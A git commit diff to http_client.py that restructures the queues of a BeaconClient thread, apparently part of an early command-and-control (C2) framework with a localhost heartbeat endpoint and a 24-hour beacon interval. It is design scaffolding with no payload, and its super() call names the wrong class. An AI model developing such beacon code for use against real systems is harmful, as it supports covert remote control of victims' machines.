9c31c5cb5919ce8c13fbd719739ad2130241cab9
cybersecmoo <50770700+cybersecmoo@users.noreply.github.com>
2019-11-03 17:53:19 +0000

    Restructure the Queues

--- http_client.py
+++ http_client.py
@@ -3,18 +3,21 @@ import http
 
 
 class BeaconClient(threading.Thread):
-    def __init__(self, commands):
+    def __init__(self, master_queue, server_queue, client_queue):
         # `commands` is a Queue of commands from the main C2 client class
         super(ClientThread, self).__init__()
         self.endpoint = "http://localhost:5000/api/heartbeat/"
-        self.commands = commands
+        self.master_queue = master_queue
+        self.server_queue = server_queue
+        self.client_queue = client_queue
+        self.sleepTime = 24 * 60 * 60 * 1000    # 24 hours between beacons
 
         self.stop_request = threading.Event()
 
+    # The master queue is populated using the raw input from the beacon
+    # This class then hands off those commands where necessary to the other threads
     def run(self):
+        # We loop through all the commands that have not yet been handled on the master queue,
+        # then grab the commands off the beacon response and action those,
+        # then sleep for the configured period of time
         while not self.stop_request.is_set():
-            command = self.commands.get(True, 0.05)
-
-            if command == "CHANGE_ENDPOINT":
-                newEndpoint = self.commands.get(True, 0.05)
-                self.endpoint = newEndpoint
